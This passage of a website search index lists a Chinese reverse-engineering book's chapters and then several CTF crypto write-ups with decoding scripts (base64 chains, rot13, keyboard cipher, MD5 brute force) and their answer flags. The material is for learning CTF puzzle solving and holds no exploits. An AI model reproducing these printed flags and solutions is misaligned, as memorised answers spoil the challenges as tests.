            "title": "16.3.1  外壳的加载过程 458"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1632-458", 
            "text": "", 
            "title": "16.3.2  自建输入表 458"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1633-459", 
            "text": "", 
            "title": "16.3.3  外壳引导段 459"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1634-462", 
            "text": "", 
            "title": "16.3.4  外壳第二段 462"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#164-467", 
            "text": "", 
            "title": "16.4  将外壳部分添加至原程序 467"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#17-471", 
            "text": "", 
            "title": "第17章  虚拟机的设计 471"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#171-471", 
            "text": "", 
            "title": "17.1  原理 471"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1711-472", 
            "text": "", 
            "title": "17.1.1  反汇编引擎 472"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1712-472", 
            "text": "", 
            "title": "17.1.2  指令分类 472"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#172-473", 
            "text": "", 
            "title": "17.2  启动框架和调用约定 473"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1721-vstartvm-473", 
            "text": "", 
            "title": "17.2.1  调度器VStartVM 473"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1722-vmcontext-474", 
            "text": "", 
            "title": "17.2.2  虚拟环境：VMContext 474"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1723-vbeginvcheckesp-474", 
            "text": "", 
            "title": "17.2.3  平衡堆栈：VBegin和VCheckEsp 474"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#173-handler-475", 
            "text": "", 
            "title": "17.3  Handler的设计 475"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1731-handler-475", 
            "text": "", 
            "title": "17.3.1  辅助Handler 475"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1732-handler-476", 
            "text": "", 
            "title": "17.3.2  普通Handler和指令拆解 476"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1733-477", 
            "text": "", 
            "title": "17.3.3  标志位问题 477"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1734-478", 
            "text": "", 
            "title": "17.3.4  相同作用的指令 478"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1735-478", 
            "text": "", 
            "title": "17.3.5  转移指令 478"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1736-479", 
            "text": "", 
            "title": "17.3.6  转移跳转指令的另一种实现 479"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1737-call-480", 
            "text": "", 
            "title": "17.3.7  call指令 480"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1738-retn-481", 
            "text": "", 
            "title": "17.3.8  retn指令 481"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1739-481", 
            "text": "", 
            "title": "17.3.9  不可模拟指令 481"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#174-482", 
            "text": "", 
            "title": "17.4  托管代码的异常处理 482"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1741-vc-482", 
            "text": "", 
            "title": "17.4.1  VC++的异常处理 482"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1742-delphi-486", 
            "text": "", 
            "title": "17.4.2  Delphi的异常处理 486"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#175-490", 
            "text": "", 
            "title": "17.5  小结 490"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#pediy", 
            "text": "", 
            "title": "第八篇  PEDIY篇"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#18-492", 
            "text": "", 
            "title": "第18章  补丁技术 492"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#181-492", 
            "text": "", 
            "title": "18.1  文件补丁 492"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#182-493", 
            "text": "", 
            "title": "18.2  内存补丁 493"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1821-493", 
            "text": "", 
            "title": "18.2.1  跨进程内存存取机制 493"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1822-debug-api-495", 
            "text": "", 
            "title": "18.2.2  Debug API机制 495"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1823-498", 
            "text": "", 
            "title": "18.2.3  利用调试寄存器机制 498"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1824-dll-501", 
            "text": "", 
            "title": "18.2.4  DLL劫持技术 501"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#183-smc-505", 
            "text": "", 
            "title": "18.3  SMC补丁技术 505"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1831-smc-505", 
            "text": "", 
            "title": "18.3.1  单层SMC补丁技术 505"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1832-smc-506", 
            "text": "", 
            "title": "18.3.2  多层SMC补丁技术 506"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#184-508", 
            "text": "", 
            "title": "18.4  补丁工具 508"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#19-510", 
            "text": "", 
            "title": "第19章  代码的二次开发 510"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#191-510", 
            "text": "", 
            "title": "19.1  数据对齐 510"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#192-510", 
            "text": "", 
            "title": "19.2  增加空间 510"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1921-510", 
            "text": "", 
            "title": "19.2.1  区块间隙 510"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1922-511", 
            "text": "", 
            "title": "19.2.2  手工构造区块 511"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1923-512", 
            "text": "", 
            "title": "19.2.3  工具辅助构造区块 512"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#193-512", 
            "text": "", 
            "title": "19.3  获得函数的调用 512"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1931-513", 
            "text": "", 
            "title": "19.3.1  增加输入函数 513"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1932-dll-514", 
            "text": "", 
            "title": "19.3.2  显式链接调用DLL 514"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#194-514", 
            "text": "", 
            "title": "19.4  代码的重定位 514"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1941-514", 
            "text": "", 
            "title": "19.4.1  修复重定位表 514"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1942-516", 
            "text": "", 
            "title": "19.4.2  代码的自定位技术 516"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#195-517", 
            "text": "", 
            "title": "19.5  增加输出函数 517"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#196-518", 
            "text": "", 
            "title": "19.6  消息循环 518"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1961-wndproc-518", 
            "text": "", 
            "title": "19.6.1  WndProc函数 518"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1962-519", 
            "text": "", 
            "title": "19.6.2  寻找消息循环 519"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1963-wndproc-520", 
            "text": "", 
            "title": "19.6.3  WndProc汇编形式 520"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#197-wndproc-521", 
            "text": "", 
            "title": "19.7  修改WndProc扩充功能 521"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1971-wndproc-521", 
            "text": "", 
            "title": "19.7.1  扩充WndProc 521"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1972-exit-522", 
            "text": "", 
            "title": "19.7.2  扩充Exit菜单功能 522"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1973-open-522", 
            "text": "", 
            "title": "19.7.3  扩充Open菜单功能 522"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#198-525", 
            "text": "", 
            "title": "19.8  增加接口 525"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1981-dll-525", 
            "text": "", 
            "title": "19.8.1  用DLL增加功能 525"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1982-526", 
            "text": "", 
            "title": "19.8.2  扩展消息循环 526"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#a-531528", 
            "text": "", 
            "title": "附录A  浮点指令 531528"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#b-visual-c-537534", 
            "text": "", 
            "title": "附录B  在Visual C++中使用内联汇编 537534"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_PHP_decode/", 
            "text": "题目\n\n\n\n\n密文：iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas \n\n\n\n\n\n\n解答思路\n\n\n\n\n编写解密函数decode\n\n\n解密相应字符串\n\n\n\n\n解题步骤\n\n\n\n\n解密函数：\n\n\n\n\n!doctype html\n\n\n?php\nfunction encode($str){\n    $_o = strrev($str);\n    for($_0=0;$_0\nstrlen($_o);$_0++){\n        $_c = substr($_o,$_0,1);\n        $__ = ord($_c)+1;\n        $_c = chr($__);\n        $_ = $_.$_c;\n    }\n    return str_rot13(strrev(base64_encode($_)));\n}\nfunction decode($str){\n    $_o =  base64_decode(strrev(str_rot13($str)));\n    for($_0=0;$_0\nstrlen($_o);$_0++){\n        $_c = substr($_o,$_0,1);\n        $__ = ord($_c)-1;\n        $_c = chr($__);\n        $_ = $_.$_c;\n    }\n    return strrev($_);\n\n}\n$str = 'iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas';\necho decode($str).\n\\n\n;\n?\n\n\n\n\n\n\n\n在线运行：http://www.dooccn.com/php5.6/\n\n\n\n\n得到答案：nctf{rot13_and_base64_and_strrev}\n\n\n待实现\n\n\n\n\n判断题目特征：\ncrypto\n \nphp\n \nOCR\n\n\nOCR读取图片，得到加密函数，提交给FeatherDuster\n\n\nFeatherDuster自动生成解密函数，并运行得到结果\n\n\n自动提交flag", 
            "title": "[ctf.nuptzj.cn] PHP decode"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_PHP_decode/#_1", 
            "text": "密文：iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_PHP_decode/#_2", 
            "text": "编写解密函数decode  解密相应字符串", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_PHP_decode/#_3", 
            "text": "解密函数：   !doctype html  ?php\nfunction encode($str){\n    $_o = strrev($str);\n    for($_0=0;$_0 strlen($_o);$_0++){\n        $_c = substr($_o,$_0,1);\n        $__ = ord($_c)+1;\n        $_c = chr($__);\n        $_ = $_.$_c;\n    }\n    return str_rot13(strrev(base64_encode($_)));\n}\nfunction decode($str){\n    $_o =  base64_decode(strrev(str_rot13($str)));\n    for($_0=0;$_0 strlen($_o);$_0++){\n        $_c = substr($_o,$_0,1);\n        $__ = ord($_c)-1;\n        $_c = chr($__);\n        $_ = $_.$_c;\n    }\n    return strrev($_);\n\n}\n$str = 'iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas';\necho decode($str). \\n ;\n?    在线运行：http://www.dooccn.com/php5.6/   得到答案：nctf{rot13_and_base64_and_strrev}", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_PHP_decode/#_4", 
            "text": "判断题目特征： crypto   php   OCR  OCR读取图片，得到加密函数，提交给FeatherDuster  FeatherDuster自动生成解密函数，并运行得到结果  自动提交flag", 
            "title": "待实现"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_base64_N_times/", 
            "text": "题目\n\n\n\n\nhttp://chinalover.sinaapp.com/decode1/base64.txt\n\n\n\n\n解题\n\n\n思路\n\n\n\n\n提示多次base64加密，使用python\n\n\n\n\n步骤\n\n\n\n\npython代码实现\n\n\n\n\npython\n  # coding:UTF-8\n  import base64\n  import urllib2\n  url = 'http://chinalover.sinaapp.com/decode1/base64.txt'\n  data = urllib2.urlopen(url).read().replace(\"\\n\", \"\")\n  i = 1\n  while i \n 20:\n      data = base64.b64decode(data)\n      print data\n      i = i+1\n\n\n待实现\n\n\n\n\n在FeatherDuster中添加一种加密方式多次解密的方法\n\n\n需要判断最终解密结果的有效性，一般包含有意义的词组\n\n\n或者判断有不是base64加密的字符\n\n\n同时可以判断该字符是否符合flag的自定义格式", 
            "title": "[ctf.nuptzj.cn] base64 N times"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_base64_N_times/#_1", 
            "text": "http://chinalover.sinaapp.com/decode1/base64.txt", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_base64_N_times/#_2", 
            "text": "", 
            "title": "解题"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_base64_N_times/#_3", 
            "text": "提示多次base64加密，使用python", 
            "title": "思路"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_base64_N_times/#_4", 
            "text": "python代码实现   python\n  # coding:UTF-8\n  import base64\n  import urllib2\n  url = 'http://chinalover.sinaapp.com/decode1/base64.txt'\n  data = urllib2.urlopen(url).read().replace(\"\\n\", \"\")\n  i = 1\n  while i   20:\n      data = base64.b64decode(data)\n      print data\n      i = i+1", 
            "title": "步骤"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_base64_N_times/#_5", 
            "text": "在FeatherDuster中添加一种加密方式多次解密的方法  需要判断最终解密结果的有效性，一般包含有意义的词组  或者判断有不是base64加密的字符  同时可以判断该字符是否符合flag的自定义格式", 
            "title": "待实现"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_base64_all/", 
            "text": "题目\n\n\n\n\nbase64全家桶全家桶全家桶！ 我怎么饿了。。。。。。 密文(解密前删除回车)：R1pDVE1NWlhHUTNETU4yQ0dZWkRNTUpYR00zREtNWldHTTJES1JSV0dJM0RDTlpUR1kyVEdNWlRHSTJVTU5SUkdaQ1RNTkJWSVk zREVOUlJHNFpUTU5KVEdFWlRNTjJF \n\n\n\n\n解答\n\n\n思路\n\n\n\n\n全家桶 解释为使用了所有的base加密算法\n\n\n\n\n\n\nbase64、base32、base16可以分别编码转化8位字节为6位、5位、4位。16,32,64分别表示用多少个字符来编码，这里我注重介绍base64。Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据。包括MIME的email，email via MIME,在XML中存储复杂数据。 \n\n\n编码原理：Base64编码要求把3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式，6位2进制能表示的最大数是2的6次方是64，这也是为什么是64个字符(A-Z,a-z，0-9，+，/这64个编码字符，=号不属于编码字符，而是填充字符)的原因 \n\n\nhex也称为base16，意思是使用16个可见字符来表示一个二进制数组，编码后数据大小将翻倍,因为1个字符需要用2个可见字符来表示。 \n\n\n\n\n使用的算法包括：base64，base32,base16(hex)\n\n\n\n\n可能的加密顺序：\n\n\n\n\nbase64 --\n base32 -\n  hex\n\n\n三种加密方式的各种可能组合方式\n\n\n待实现\n\n\n\n\n在FeatherDuster中添加多种解密方式相结合的方法", 
            "title": "[ctf.nuptzj.cn] base64 all"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_base64_all/#_1", 
            "text": "base64全家桶全家桶全家桶！ 我怎么饿了。。。。。。 密文(解密前删除回车)：R1pDVE1NWlhHUTNETU4yQ0dZWkRNTUpYR00zREtNWldHTTJES1JSV0dJM0RDTlpUR1kyVEdNWlRHSTJVTU5SUkdaQ1RNTkJWSVk zREVOUlJHNFpUTU5KVEdFWlRNTjJF", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_base64_all/#_2", 
            "text": "", 
            "title": "解答"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_base64_all/#_3", 
            "text": "全家桶 解释为使用了所有的base加密算法    base64、base32、base16可以分别编码转化8位字节为6位、5位、4位。16,32,64分别表示用多少个字符来编码，这里我注重介绍base64。Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据。包括MIME的email，email via MIME,在XML中存储复杂数据。   编码原理：Base64编码要求把3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式，6位2进制能表示的最大数是2的6次方是64，这也是为什么是64个字符(A-Z,a-z，0-9，+，/这64个编码字符，=号不属于编码字符，而是填充字符)的原因   hex也称为base16，意思是使用16个可见字符来表示一个二进制数组，编码后数据大小将翻倍,因为1个字符需要用2个可见字符来表示。    使用的算法包括：base64，base32,base16(hex)   可能的加密顺序：   base64 --  base32 -   hex  三种加密方式的各种可能组合方式", 
            "title": "思路"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_base64_all/#_4", 
            "text": "在FeatherDuster中添加多种解密方式相结合的方法", 
            "title": "待实现"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_easy/", 
            "text": "easy\n\n\n题目\n\n\n\n\n密文：bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9 \n\n\n\n\n解答\n\n\n思路\n\n\n\n\n对\n\n\n\n\nbase64加密字符串字符包含如下：\n\n\n\n\nA-Za-z0-9+/=\n\n\n\n\n题目密文符合上述要求，所以考虑使用base64进行解码\n\n\n\n\n解码后得到答案\n\n\n\n\n解题步骤\n\n\n\n\n\n\n工具：FeatherDuster\n\n\n\n\n\n\n步骤：\n\n\n\n\n\n\n创建文件\n\n\nshell\n echo bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9 \n tmp.txt\n\n\n\n\n\n\n将tmp.txt文件加入到FeatherDuster的sample中\n\n\nshell\n featherduster ./tmp.txt\n\n\n\n\n\n\n进入featherduster的交互式界面，使用\nsamples\n命令可查看是否已经将tmp.txt加入\n\n\n返回结果：\n\n\n\n\n------------------------------------------------------------\n'bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9\\n'\n------------------------------------------------------------\n\n\n\n\n\n\n\n\n使用\nanalyze\n命令进行分析\n\n\n\n\n返回结果：\n\n\n\n\n\n\n[+] Analyzing samples...\n[+] Messages appear to be Base64 encoded, Base64 decoding and analyzing again.\n[+] Messages may be encrypted with a stream cipher or simple XOR.\n\n\n\n\n\n\n根据结果提示，应该使用\nstream cipher or simple XOR\n进行解密\n\n\n\n\n这里选择模块\nsingle_byte_xor\n\n\n\n\n\n\n使用命令\nuse single_byte_xor\n设置解码模块\n\n\n\n\n\n\n使用\nrun\n命令进行解码，得到结果\n\n\n\n\n[+] Running single-byte XOR brute force attack...\n\n\nBest candidate decryptions:\n----------------------------------------\n\n\n'nctf{this_is_base64_encode}' (score: 2.905372)\n'~sdvkdxycOycOrqcu\n$Ou~s\\x7ftum' (score: 4.481013)\n'lavdyvjkq]kq]`cqg46]glamfg\\x7f' (score: 4.519879)", 
            "title": "easy"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_easy/#easy", 
            "text": "", 
            "title": "easy"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_easy/#_1", 
            "text": "密文：bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_easy/#_2", 
            "text": "", 
            "title": "解答"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_easy/#_3", 
            "text": "对   base64加密字符串字符包含如下：   A-Za-z0-9+/=   题目密文符合上述要求，所以考虑使用base64进行解码   解码后得到答案", 
            "title": "思路"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_easy/#_4", 
            "text": "工具：FeatherDuster    步骤：    创建文件  shell\n echo bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9   tmp.txt    将tmp.txt文件加入到FeatherDuster的sample中  shell\n featherduster ./tmp.txt    进入featherduster的交互式界面，使用 samples 命令可查看是否已经将tmp.txt加入  返回结果：   ------------------------------------------------------------\n'bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9\\n'\n------------------------------------------------------------     使用 analyze 命令进行分析   返回结果：    [+] Analyzing samples...\n[+] Messages appear to be Base64 encoded, Base64 decoding and analyzing again.\n[+] Messages may be encrypted with a stream cipher or simple XOR.    根据结果提示，应该使用 stream cipher or simple XOR 进行解密   这里选择模块 single_byte_xor    使用命令 use single_byte_xor 设置解码模块    使用 run 命令进行解码，得到结果   [+] Running single-byte XOR brute force attack...  Best candidate decryptions:\n----------------------------------------  'nctf{this_is_base64_encode}' (score: 2.905372)\n'~sdvkdxycOycOrqcu $Ou~s\\x7ftum' (score: 4.481013)\n'lavdyvjkq]kq]`cqg46]glamfg\\x7f' (score: 4.519879)", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_keyboard/", 
            "text": "题目\n\n\n\n\n看键盘看键盘看键盘！ 答案非标准格式，提交前加上nctf{} \n\n\nytfvbhn tgbgy hjuygbn yhnmki tgvhn uygbnjm uygbn yhnijm \n\n\n\n\n解答思路\n\n\n\n\n\n\n提示看键盘，应该是键盘密码\n\n\n\n\n\n\n按照密文画出相应的字母\n\n\n\n\n\n\n解题步骤\n\n\n\n\n具体参看：https://blog.csdn.net/cj1112/article/details/51018146\n\n\n\n\n得到答案：nctf{areuhack}\n\n\n待实现\n\n\n\n\npython实现键盘密码解密\n\n\n别人已经实现的键盘密码解密\n\n\n在FeatherDuster中添加该加密的解密方式", 
            "title": "[ctf.nuptzj.cn] keyboard"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_keyboard/#_1", 
            "text": "看键盘看键盘看键盘！ 答案非标准格式，提交前加上nctf{}   ytfvbhn tgbgy hjuygbn yhnmki tgvhn uygbnjm uygbn yhnijm", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_keyboard/#_2", 
            "text": "提示看键盘，应该是键盘密码    按照密文画出相应的字母", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_keyboard/#_3", 
            "text": "具体参看：https://blog.csdn.net/cj1112/article/details/51018146   得到答案：nctf{areuhack}", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_keyboard/#_4", 
            "text": "python实现键盘密码解密  别人已经实现的键盘密码解密  在FeatherDuster中添加该加密的解密方式", 
            "title": "待实现"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_md5/", 
            "text": "题目\n\n\n\n\npython大法好！\n这里有一段丢失的md5密文\ne9032???da???08????911513?0???a2\n要求你还原出他并且加上nctf{}提交\n\n\n已知线索 明文为： TASC?O3RJMV?WDJKX?ZM\n\n\n\n\n解题\n\n\n思路\n\n\n\n\n遍历明文中每个未知的字符，生成对应的md5值，与给出的MD5值进行比较，得到答案\n\n\n\n\n步骤\n\n\n\n\npython代码实现\n\n\n\n\n```python\n  import hashlib\n  plaintext = \"TASC?O3RJMV?WDJKX?ZM\"\n  ciphertext = \"e9032???da???08????911513?0???a2\"\n\n\nfor i in range(32,127):\n      for j in range(32,127):\n          for k in range(32,127):\n              m = hashlib.md5()\n              str = 'TASC'+chr(i)+'O3RJMV'+chr(j)+'WDJKX'+chr(k)+'ZM'\n              m.update(str)\n              des = m.hexdigest()\n              if 'e9032' in des and 'da' in des and '08' in des and '911513' in des and 'a2' in des:\n                  print str\n                  print des\n  ```\n\n\n待实现\n\n\n\n\n实现该题目的自动答题通用性较低，可以考虑实现chrome的\npython console\n，自动读取这两个字符串\n\n\n自动生成样板代码，提供参考，加快解题速度", 
            "title": "[ctf.nuptzj.cn] md5"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_md5/#_1", 
            "text": "python大法好！\n这里有一段丢失的md5密文\ne9032???da???08????911513?0???a2\n要求你还原出他并且加上nctf{}提交  已知线索 明文为： TASC?O3RJMV?WDJKX?ZM", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_md5/#_2", 
            "text": "", 
            "title": "解题"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_md5/#_3", 
            "text": "遍历明文中每个未知的字符，生成对应的md5值，与给出的MD5值进行比较，得到答案", 
            "title": "思路"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_md5/#_4", 
            "text": "python代码实现   ```python\n  import hashlib\n  plaintext = \"TASC?O3RJMV?WDJKX?ZM\"\n  ciphertext = \"e9032???da???08????911513?0???a2\"  for i in range(32,127):\n      for j in range(32,127):\n          for k in range(32,127):\n              m = hashlib.md5()\n              str = 'TASC'+chr(i)+'O3RJMV'+chr(j)+'WDJKX'+chr(k)+'ZM'\n              m.update(str)\n              des = m.hexdigest()\n              if 'e9032' in des and 'da' in des and '08' in des and '911513' in des and 'a2' in des:\n                  print str\n                  print des\n  ```", 
            "title": "步骤"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_md5/#_5", 
            "text": "实现该题目的自动答题通用性较低，可以考虑实现chrome的 python console ，自动读取这两个字符串  自动生成样板代码，提供参考，加快解题速度", 
            "title": "待实现"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_mixed_base64/", 
            "text": "题目\n\n\n\n\n密文：http://ctf.nuptzj.cn/static/uploads/3e5c0c7045f2a81363a45d97d69911e3/code.txt\n\n\n\n\nbase64编码的图片，显示python加密函数\n\n\n解答思路\n\n\n\n\n编写解密函数decode，采用爆破的方法\n\n\n解密相应字符串\n\n\n\n\n解题步骤\n\n\n\n\n解密方法：\n\n\n\n\nfrom base64 import *\nimport urllib2\nurl = \nhttp://ctf.nuptzj.cn/static/uploads/3e5c0c7045f2a81363a45d97d69911e3/code.txt\n\ns = urllib2.urlopen(url).read().replace(\n\\n\n,\n)\nresult={\n    '16':lambda x:b16decode(x),\n    '32':lambda x:b32decode(x),\n    '64':lambda x:b64decode(x)\n    }\nfor i_1 in ['16','32','64']:\n    for i_2 in ['16','32','64']:\n        for i_3 in ['16','32','64']:\n            for i_4 in ['16','32','64']:\n                for i_5 in ['16','32','64']:\n                    for i_6 in ['16','32','64']:\n                        for i_7 in ['16','32','64']:\n                            for i_8 in ['16','32','64']:\n                                for i_9 in ['16','32','64']:\n                                    for i_10 in ['16','32','64']:\n                                        try:\n                                            print result[i_10](result[i_9](result[i_8](result[i_7](result[i_6](result[i_5](result[i_4](result[i_3](result[i_2](result[i_1](s))))))))))\n                                        except:\n                                            continue\n\n\n\n\n得到答案：nctf{random_mixed_base64_encode}\n\n\n待实现\n\n\n\n\n判断题目特征：\ncrypto\n \npython\n \nOCR\n\n\nOCR读取图片，得到加密函数，提交给FeatherDuster\n\n\nFeatherDuster自动生成解密函数，并运行得到结果\n\n\n自动提交flag\n\n\n此题如何自动生成解密函数，是个难点，暂时解决不了\n\n\n如何使用正则判断编码属于base64、base32、base16，需要进一步考虑，这样在爆破过程中，可以减少循环次数", 
            "title": "[ctf.nuptzj.cn] mixed base64"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_mixed_base64/#_1", 
            "text": "密文：http://ctf.nuptzj.cn/static/uploads/3e5c0c7045f2a81363a45d97d69911e3/code.txt   base64编码的图片，显示python加密函数", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_mixed_base64/#_2", 
            "text": "编写解密函数decode，采用爆破的方法  解密相应字符串", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_mixed_base64/#_3", 
            "text": "解密方法：   from base64 import *\nimport urllib2\nurl =  http://ctf.nuptzj.cn/static/uploads/3e5c0c7045f2a81363a45d97d69911e3/code.txt \ns = urllib2.urlopen(url).read().replace( \\n , )\nresult={\n    '16':lambda x:b16decode(x),\n    '32':lambda x:b32decode(x),\n    '64':lambda x:b64decode(x)\n    }\nfor i_1 in ['16','32','64']:\n    for i_2 in ['16','32','64']:\n        for i_3 in ['16','32','64']:\n            for i_4 in ['16','32','64']:\n                for i_5 in ['16','32','64']:\n                    for i_6 in ['16','32','64']:\n                        for i_7 in ['16','32','64']:\n                            for i_8 in ['16','32','64']:\n                                for i_9 in ['16','32','64']:\n                                    for i_10 in ['16','32','64']:\n                                        try:\n                                            print result[i_10](result[i_9](result[i_8](result[i_7](result[i_6](result[i_5](result[i_4](result[i_3](result[i_2](result[i_1](s))))))))))\n                                        except:\n                                            continue  得到答案：nctf{random_mixed_base64_encode}", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_mixed_base64/#_4", 
            "text": "判断题目特征： crypto   python   OCR  OCR读取图片，得到加密函数，提交给FeatherDuster  FeatherDuster自动生成解密函数，并运行得到结果  自动提交flag  此题如何自动生成解密函数，是个难点，暂时解决不了  如何使用正则判断编码属于base64、base32、base16，需要进一步考虑，这样在爆破过程中，可以减少循环次数", 
            "title": "待实现"
        }, 
        {
            "location": "/wargame/crypto/[ctf.nuptzj.cn]_vigenere/", 
